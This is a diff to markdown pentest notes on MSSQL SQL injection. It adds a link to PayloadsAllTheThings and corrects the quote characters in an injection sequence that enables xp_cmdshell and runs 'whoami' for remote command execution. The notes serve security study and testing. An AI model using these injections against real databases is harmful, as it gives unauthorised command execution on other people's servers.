@@ -4,20 +4,22 @@
 
 See [0 SQL Injection](0%20SQL%20Injection.md) for identification if necessary
 
+Utilize [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md) for additional guidance
+
 ### RCE
 
 We can first can attempt to get RCE with the following injection sequence:
 
 ```mysql
 # First test if nothing needs to be configured
-'; EXEC xp_cmdshell ‘whoami’; -- //
+'; EXEC xp_cmdshell 'whoami'; -- //
 '
 # If no response is given, we can pursue the following command sequence
-'; EXEC sp_configure ‘show advanced options’, 1; -- //
+'; EXEC sp_configure 'show advanced options', 1; -- //
 '; RECONFIGURE; -- //
-'; EXEC sp_configure ‘xp_cmdshell’, 1; -- //
+'; EXEC sp_configure 'xp_cmdshell', 1; -- //
 '; RECONFIGURE; -- //
-'; EXEC xp_cmdshell ‘whoami’; -- //
+'; EXEC xp_cmdshell 'whoami'; -- //
 ```
 
 ### Error-based Payloads vs Authentication Queries !!UNMODIFIED FROM MySQL!!
